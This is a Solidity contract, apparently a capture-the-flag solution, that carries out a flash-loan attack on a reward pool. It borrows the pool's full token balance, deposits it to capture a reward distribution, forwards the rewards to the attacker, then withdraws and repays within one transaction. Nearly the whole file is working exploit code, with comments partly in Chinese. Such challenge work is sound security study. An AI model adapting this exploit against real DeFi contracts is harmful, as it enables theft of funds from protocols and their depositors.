// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract MaliciousReceiver {
    address private _attacker;
    address private _flashLoanerPool;
    address private _liquidityToken;
    address private _rewardPool;
    address private _rewardToken;

    function excuteFlashLoan(bytes calldata data) external {
        // // address flashLoanerPool, address liquidityToken, address rewarderPool, address rewardToken
        (address flashLoanerPool, address liquidityToken, address rewardPool, address rewardToken) =
            abi.decode(data, (address, address, address, address));

        _attacker = msg.sender;
        _flashLoanerPool = flashLoanerPool;
        _liquidityToken = liquidityToken;
        _rewardPool = rewardPool;
        _rewardToken = rewardToken;
        // console.log("before flash loan - balance", IERC20(_liquidityToken).balanceOf(address(this)));
        // flashLoan(uint256 amount) external nonReentrant
        bytes memory dataWithSignature =
            abi.encodeWithSignature("flashLoan(uint256)", IERC20(_liquidityToken).balanceOf(_flashLoanerPool));
        (bool success,) = address(_flashLoanerPool).call(dataWithSignature);
        require(success, "MaliciousReceiver::excuteFlashLoan: flashLoan failed");
    }

    function receiveFlashLoan(uint256 amount) external {
        bytes memory distributeRewardsData;
        // approve
        IERC20(_liquidityToken).approve(_rewardPool, amount);
        // deposit
        // function deposit(uint256 amountToDeposit) external {
        bytes memory dataWithSignature = abi.encodeWithSignature("deposit(uint256)", amount);
        (bool success,) = _rewardPool.call(dataWithSignature);
        require(success, "MaliciousReceiver::receiveFlashLoan: deposit failed");
        // function distributeRewards() public returns (uint256) {
        dataWithSignature = abi.encodeWithSignature("distributeRewards()");
        (success, distributeRewardsData) = _rewardPool.call(dataWithSignature);
        require(success, "MaliciousReceiver::receiveFlashLoan: distributeRewards failed");
        uint256 rewardAmount = abi.decode(distributeRewardsData, (uint256));
        // 如果有 reward 的話，就打回去給 attacker
        if (rewardAmount > 0) {
            IERC20(_rewardToken).transfer(_attacker, IERC20(_rewardToken).balanceOf(address(this)));
        }
        // function withdraw(uint256 amountToWithdraw) external {
        dataWithSignature = abi.encodeWithSignature("withdraw(uint256)", amount);
        (success,) = _rewardPool.call(dataWithSignature);
        require(success, "MaliciousReceiver::receiveFlashLoan: withdraw failed");
        // 還錢給 flashLoanerPool
        IERC20(_liquidityToken).transfer(msg.sender, amount);
    }
}
